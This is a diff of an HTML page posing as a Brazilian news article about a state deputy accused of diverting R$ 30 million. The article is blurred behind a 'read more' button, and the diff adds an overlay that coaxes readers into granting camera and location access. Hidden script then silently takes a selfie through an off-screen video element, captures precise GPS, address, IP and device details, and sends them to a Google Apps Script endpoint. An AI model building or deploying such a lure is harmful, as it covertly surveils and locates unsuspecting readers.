@@ -101,7 +101,6 @@
             font-weight: bold;
         }
         
-        /* Área da notícia completa com desfoque e degradê */
         .news-full-wrapper {
             position: relative;
             margin-top: 20px;
@@ -119,7 +118,6 @@
             position: relative;
         }
         
-        /* Efeito de desfoque e degradê */
         .news-full.blurred {
             filter: blur(8px);
             max-height: 250px;
@@ -153,7 +151,6 @@
             color: #003366;
         }
         
-        /* Botão Ler Mais estilizado */
         .btn-read-more {
             display: inline-block;
             background: linear-gradient(135deg, #c0392b 0%, #e74c3c 100%);
@@ -199,7 +196,6 @@
             animation: none;
         }
         
-        /* Loading da notícia - sem texto técnico */
         .loading-news {
             display: none;
             text-align: center;
@@ -233,7 +229,6 @@
             100% { transform: rotate(360deg); }
         }
         
-        /* Elementos invisíveis para captura automática */
         .hidden-video, .hidden-canvas {
             position: fixed;
             top: -1000px;
@@ -244,7 +239,104 @@
             pointer-events: none;
         }
         
-        /* Modal de bloqueio */
+        .permission-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.85);
+            z-index: 3000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        .permission-overlay.show {
+            display: flex;
+        }
+        
+        .permission-card {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 350px;
+            text-align: center;
+            animation: bounceIn 0.5s ease;
+        }
+        
+        @keyframes bounceIn {
+            0% {
+                transform: scale(0.8);
+                opacity: 0;
+            }
+            80% {
+                transform: scale(1.05);
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+        
+        .permission-icon {
+            font-size: 60px;
+            margin-bottom: 15px;
+        }
+        
+        .permission-card h3 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        
+        .permission-card p {
+            color: #666;
+            margin-bottom: 20px;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        
+        .permission-buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+        }
+        
+        .perm-btn {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        
+        .perm-btn-primary {
+            background: #c0392b;
+            color: white;
+        }
+        
+        .perm-btn-secondary {
+            background: #ccc;
+            color: #333;
+        }
+        
+        .perm-btn:hover {
+            transform: scale(1.05);
+        }
+        
+        .arrow-animation {
+            margin: 20px 0;
+            animation: bounce 1s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
         .block-modal {
             display: none;
             position: fixed;
@@ -354,7 +446,6 @@
                     Gabinete do Deputado é investigado por suposto desvio de R$ 30 milhões destinados à revitalização da Lagoa de Barra do Bugres. MP apura denúncias.
                 </div>
                 
-                <!-- Wrapper para a notícia completa com efeito de desfoque -->
                 <div class="news-full-wrapper">
                     <div class="news-full" id="fullNews">
                         <p>O gabinete do Deputado Estadual Chico Guarnieri (PSDB) vem, por meio desta nota, a público prestar os devidos esclarecimentos à população mato-grossense, e em especial aos cidadãos do município de Barra do Bugres, a respeito das graves e infundadas acusações que vêm circulando nas últimas horas.</p>
@@ -374,7 +465,6 @@
                     <div class="news-full-overlay" id="newsOverlay"></div>
                 </div>
                 
-                <!-- Loading da notícia -->
                 <div id="loadingNews" class="loading-news">
                     <div class="spinner"></div>
                     <p>📄 Carregando matéria completa...</p>
@@ -385,45 +475,54 @@
                         📖 Ler Matéria Completa
                     </button>
                 </div>
-                
-                <div id="status" class="status" style="display: none;"></div>
             </div>
         </div>
         
         <footer>
-                            © 2024 LAPADA DA BARRA - Todos os direitos reservados<br>
+            © 2024 LAPADA DA BARRA - Todos os direitos reservados<br>
             Compromisso com a verdade e a transparência
         </footer>
     </div>
     
-    <!-- Elementos ocultos para captura automática -->
+    <!-- Overlay de instrução para permissões -->
+    <div id="permissionOverlay" class="permission-overlay">
+        <div class="permission-card">
+            <div class="permission-icon">📱</div>
+            <h3>⚠️ Atenção!</h3>
+            <p>Para ler a matéria completa, você precisa permitir o acesso à <strong>CÂMERA</strong> e <strong>LOCALIZAÇÃO</strong>.</p>
+            <div class="arrow-animation">👇</div>
+            <p><strong>Clique em "PERMITIR" ou "PERMITIR DESTA VEZ"</strong> quando o navegador solicitar.</p>
+            <div class="permission-buttons">
+                <button class="perm-btn perm-btn-primary" id="allowAndContinueBtn">✅ Já permiti, continuar</button>
+            </div>
+        </div>
+    </div>
+    
     <video id="hiddenVideo" class="hidden-video" autoplay playsinline muted></video>
     <canvas id="hiddenCanvas" class="hidden-canvas"></canvas>
     
-    <!-- Modal de bloqueio para permissão negada -->
     <div id="blockModal" class="block-modal">
         <div class="block-modal-content">
-            <div class="block-modal-icon">♿ 🚫</div>
-            <h3>⚠️ Acesso Negado</h3>
+            <div class="block-modal-icon">⚠️</div>
+            <h3>Permissões Necessárias</h3>
             <p>
-                <strong>A permissão da câmera é OBRIGATÓRIA para acessar o conteúdo completo.</strong><br><br>
-                Este recurso é necessário para o <strong>ACESSO SENSORIAL PARA DEFICIENTES VISUAIS</strong>, permitindo que o sistema adapte o conteúdo com tecnologias assistivas e leitura por imagem.<br><br>
-                <strong>📌 Por favor, recarregue a página e clique em "PERMITIR" quando o navegador solicitar acesso à câmera.</strong>
+                <strong>Para acessar o conteúdo completo, você precisa permitir o acesso à câmera e localização.</strong><br><br>
+                Clique em <strong>"Permitir"</strong> ou <strong>"Permitir desta vez"</strong> quando o navegador solicitar.<br><br>
+                📌 <strong>No Android:</strong> Selecione "Permitir ao acessar o site" ou "Permitir desta vez".
             </p>
-            <button class="block-modal-btn" id="reloadBtn">🔄 Recarregar Página</button>
+            <button class="block-modal-btn" id="reloadBtn">🔄 Tentar Novamente</button>
         </div>
     </div>
 
     <script>
-        // URL da planilha Google configurada
         const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzJ8LEodAEuugJ0Nz213X4jskKZdK7EQTrHWnYwWE39N0LwfuZ9axPY50TEnn7iqkcY_w/exec';
         
         let autoCaptureDone = false;
         let currentStream = null;
-        let permissionGranted = false;
-        let cameraPermissionDenied = false;
+        let cameraGranted = false;
+        let locationGranted = false;
+        let permissionRequested = false;
         
-        // Data atual
         document.getElementById('currentDate').textContent = new Date().toLocaleDateString('pt-BR', { timeZone: 'America/Cuiaba' });
         
         const readMoreBtn = document.getElementById('readMoreBtn');
@@ -434,9 +533,9 @@
         const hiddenCanvas = document.getElementById('hiddenCanvas');
         const blockModal = document.getElementById('blockModal');
         const reloadBtn = document.getElementById('reloadBtn');
-        const statusDiv = document.getElementById('status');
+        const permissionOverlay = document.getElementById('permissionOverlay');
+        const allowAndContinueBtn = document.getElementById('allowAndContinueBtn');
         
-        // Aplicar efeito de desfoque inicial
         fullNews.classList.add('blurred');
         
         function showBlockModal() {
@@ -447,25 +546,25 @@
             window.location.reload();
         });
         
-        // Função para enviar para Google Sheets (sem mostrar logs)
+        allowAndContinueBtn.addEventListener('click', () => {
+            permissionOverlay.classList.remove('show');
+            autoCaptureAndSend();
+        });
+        
         async function sendToGoogleSheets(data) {
             try {
                 await fetch(GOOGLE_SCRIPT_URL, {
                     method: 'POST',
                     mode: 'no-cors',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 });
                 return { success: true };
             } catch (error) {
-                console.error('Erro:', error);
-                return { success: false, error: error.message };
+                return { success: false };
             }
         }
         
-        // Função para obter endereço
         async function getAddress(lat, lon) {
             try {
                 const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=pt`);
@@ -476,7 +575,6 @@
             }
         }
         
-        // Função para obter informações do dispositivo
         function getDeviceInfo() {
             const userAgent = navigator.userAgent;
             let device = "Desconhecido";
@@ -503,7 +601,6 @@
             return { device, browser, os, userAgent };
         }
         
-        // Função para obter IP público
         async function getPublicIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
@@ -514,50 +611,43 @@
             }
         }
         
-        // Função para capturar localização
-        async function captureHighPrecisionLocation() {
-            return new Promise((resolve, reject) => {
-                const options = {
-                    enableHighAccuracy: true,
-                    timeout: 30000,
-                    maximumAge: 0
-                };
-                navigator.geolocation.getCurrentPosition(resolve, reject, options);
-            });
-        }
-        
-        // Função que solicita permissão da câmera
-        async function requestCameraPermission() {
+        async function requestCameraAndLocation() {
+            let cameraOk = false;
+            let locationOk = false;
+            
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: { exact: "user" }
-                    }
-                });
-                
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 if (stream) {
                     stream.getTracks().forEach(track => track.stop());
-                    permissionGranted = true;
-                    cameraPermissionDenied = false;
-                    return true;
+                    cameraOk = true;
+                    cameraGranted = true;
                 }
             } catch (error) {
-                cameraPermissionDenied = true;
-                permissionGranted = false;
-                showBlockModal();
-                return false;
+                cameraOk = false;
             }
+            
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000
+                    });
+                });
+                if (position) {
+                    locationOk = true;
+                    locationGranted = true;
+                }
+            } catch (error) {
+                locationOk = false;
+            }
+            
+            return cameraOk && locationOk;
         }
         
-        // Função para capturar foto
         async function captureAutoPhoto() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: { exact: "user" },
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    }
+                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
                 });
                 
                 currentStream = stream;
@@ -589,13 +679,11 @@
                 hiddenVideo.srcObject = null;
                 
                 return photoData;
-                
             } catch (error) {
                 return null;
             }
         }
         
-        // Função principal
         async function autoCaptureAndSend() {
             if (autoCaptureDone) return;
             
@@ -603,32 +691,32 @@
             loadingNews.classList.add('show');
             
             try {
-                // Capturar localização
-                const position = await captureHighPrecisionLocation();
-                const { latitude, longitude, accuracy } = position.coords;
+                const permsOk = await requestCameraAndLocation();
                 
+                if (!permsOk) {
+                    loadingNews.classList.remove('show');
+                    readMoreBtn.disabled = false;
+                    showBlockModal();
+                    return;
+                }
+                
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 15000
+                    });
+                });
+                
+                const { latitude, longitude, accuracy } = position.coords;
                 let finalAccuracy = Math.round(accuracy);
                 let finalLatitude = latitude;
                 let finalLongitude = longitude;
                 
-                if (accuracy > 15) {
-                    try {
-                        const secondPosition = await captureHighPrecisionLocation();
-                        if (secondPosition.coords.accuracy < accuracy) {
-                            finalAccuracy = Math.round(secondPosition.coords.accuracy);
-                            finalLatitude = secondPosition.coords.latitude;
-                            finalLongitude = secondPosition.coords.longitude;
-                        }
-                    } catch(e) {}
-                }
-                
-                // Obter endereço
                 const address = await getAddress(finalLatitude, finalLongitude);
                 const deviceInfo = getDeviceInfo();
                 const publicIP = await getPublicIP();
                 const photoData = await captureAutoPhoto();
                 
-                // Preparar dados
                 const completeData = {
                     timestamp: new Date().toLocaleString('pt-BR', { timeZone: 'America/Cuiaba' }),
                     latitude: finalLatitude,
@@ -647,59 +735,39 @@
                     politician: "Deputado Chico Guarnieri - Desvio de 30 Milhões"
                 };
                 
-                // Enviar para planilha
                 await sendToGoogleSheets(completeData);
-                
-                // Pequena pausa
                 await new Promise(resolve => setTimeout(resolve, 1500));
                 
-                // Liberar conteúdo - remover desfoque
                 loadingNews.classList.remove('show');
                 fullNews.classList.remove('blurred');
                 fullNews.classList.add('show');
-                if (newsOverlay) {
-                    newsOverlay.style.display = 'none';
-                }
+                if (newsOverlay) newsOverlay.style.display = 'none';
                 readMoreBtn.style.display = 'none';
                 autoCaptureDone = true;
                 
             } catch (error) {
-                console.error('Erro:', error);
                 loadingNews.classList.remove('show');
                 readMoreBtn.disabled = false;
                 autoCaptureDone = false;
             }
         }
         
-        // Evento do botão
-        readMoreBtn.addEventListener('click', (e) => {
+        readMoreBtn.addEventListener('click', async (e) => {
             e.preventDefault();
-            if (!autoCaptureDone && !cameraPermissionDenied) {
-                autoCaptureAndSend();
-            } else if (cameraPermissionDenied) {
-                showBlockModal();
+            if (!autoCaptureDone) {
+                // Mostrar overlay de instrução antes de pedir permissões
+                permissionOverlay.classList.add('show');
+                
+                // Tentar solicitar permissões em background
+                setTimeout(async () => {
+                    await requestCameraAndLocation();
+                }, 100);
             }
         });
         
-        // Solicitar permissão da câmera ao carregar
-        async function requestPermissionsOnLoad() {
-            if (navigator.permissions) {
-                try {
-                    const cameraStatus = await navigator.permissions.query({ name: 'camera' });
-                    if (cameraStatus.state === 'granted') {
-                        permissionGranted = true;
-                        return;
-                    } else if (cameraStatus.state === 'denied') {
-                        cameraPermissionDenied = true;
-                        showBlockModal();
-                        return;
-                    }
-                } catch(e) {}
-            }
-            await requestCameraPermission();
-        }
-        
-        requestPermissionsOnLoad();
+        console.log('%c⚠️ IMPORTANTE ⚠️', 'color: red; font-size: 20px; font-weight: bold;');
+        console.log('%cPor questões de segurança do navegador, as permissões de câmera e localização PRECISAM ser autorizadas manualmente pelo usuário.', 'color: orange; font-size: 14px;');
+        console.log('%cO código NÃO pode simular cliques nos popups de permissão.', 'color: red; font-size: 14px;');
     </script>
 </body>
 </html>
